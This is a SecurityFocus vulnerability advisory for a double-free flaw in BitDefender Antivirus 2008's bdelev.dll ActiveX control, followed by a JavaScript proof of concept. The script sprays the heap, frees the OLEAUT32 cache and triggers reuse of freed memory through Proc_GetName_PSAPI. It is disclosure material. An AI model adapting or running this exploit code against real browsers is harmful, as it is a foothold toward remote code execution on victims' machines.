source: http://www.securityfocus.com/bid/26824/info

A BitDefender Antivirus 2008 ActiveX control is prone a double-free vulnerability because of a flaw in the way that the 'bdelev.dll' library handles certain object data prior to returning it.

Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.

this.Oleaut32 = new Array();
this.Oleaut32["cache"] = new Array();
this.base = "A";
while (base.length<0x8000) base+= base;
this.base = base.substring (0, (0x8000-6)/2);
CollectGarbage();
3
// Fill the cache with block of maximum size
for (i=0;i<6;i++)
{
this.Oleaut32["cache"].push(base.substring (0, (0x20-6)/2));
this.Oleaut32["cache"].push(base.substring (0, (0x40-6)/2));
this.Oleaut32["cache"].push(base.substring (0, (0x100-6)/2));
this.Oleaut32["cache"].push(base.substring (0, (0x8000-6)/2));
}
this.bitdefender = new ActiveXObject('bdelev.ElevatedHelperClass.1');
// free cache of oleaut32
delete Oleaut32["cache"];
CollectGarbage();
// POC
for (pid=0;pid<4000;pid+=4)
{
try
{
// Find first Module_Path
var Module_Path = bitdefender.Proc_GetName_PSAPI (pid);
// Display the original string in free block memory
///////////////////////////////////////////////////
alert (Module_Path); -> C:\Windows\... (exemple)
/////////////////////
// Uses free block
var y = base.substring(0,Module_Path.length);
// Display the result of the crushing of the memory
///////////////////////////////////////////////////
alert (Module_Path); -> AAAAAAAAAAAA...
/////////////////////
break;
}
catch(e) {}
}